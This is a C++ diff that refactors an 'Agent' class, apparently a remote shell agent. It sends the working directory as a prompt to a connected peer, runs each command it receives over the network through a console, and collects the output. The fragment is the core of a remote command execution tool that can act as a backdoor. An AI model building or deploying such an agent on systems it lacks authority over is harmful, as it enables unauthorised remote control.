@@ -3,32 +3,12 @@
 void Agent::OnConnect(Connection connection)
 {
 	Packet packet;
-	console.Cmd2Buffer();
+	std::filesystem::path path = std::filesystem::current_path();
 
-	std::string message = console.GetCmdOutput();
-
-	packet.InsertString(message);
+	packet.InsertString(path.string() + ">");
 	connection.Send(packet);
 }
 
-
-bool Agent::Initialize()
-{
-	if (not console.InitializeCmdPipe())
-	{
-		std::cerr << "Error at InitializeCmdPipe." << std::endl;
-		return false;
-	}
-
-	if (not console.Launch())
-	{
-		std::cerr << "Error at Launch." << std::endl;
-		console.Close();
-		return false;
-	}
-	
-	return true;
-}
 
 bool Agent::ShutDown()
 {
@@ -37,13 +17,7 @@ bool Agent::ShutDown()
 		std::cerr << "Error at Close." << std::endl;
 		return false;
 	}
-
-	if (not console.Close())
-	{
-		std::cerr << "Error at Close." << std::endl;
-		return false;
-	}
-
+	
 	return true;
 }
 
@@ -56,8 +30,8 @@ bool Agent::Logic()
 		std::cerr << "Agent::Logic::Recv Error." << std::endl;
 		return false;
 	}
-	
-	std::string msg = packet.ExtractString() + '\n';
+
+	std::string msg = packet.ExtractString();
 
 	if (msg == "AgentDown\n")
 	{
@@ -65,17 +39,8 @@ bool Agent::Logic()
 		return false;
 	}
 
-	if (not console.Buffer2Cmd(msg))
-	{
-		std::cerr << "Agent::Logic::Buffer2Cmd Error." << std::endl;
-		return false;
-	}
-	
-	if (not console.Cmd2Buffer())
-	{
-		std::cerr << "Agent::Logic::Cmd2Buffer Error." << std::endl;
-		return false;
-	}
+	console.InitializePromptPipe();
+	console.ExecCommand(msg);
 	
 	std::string cmdOutput = console.GetCmdOutput();
 
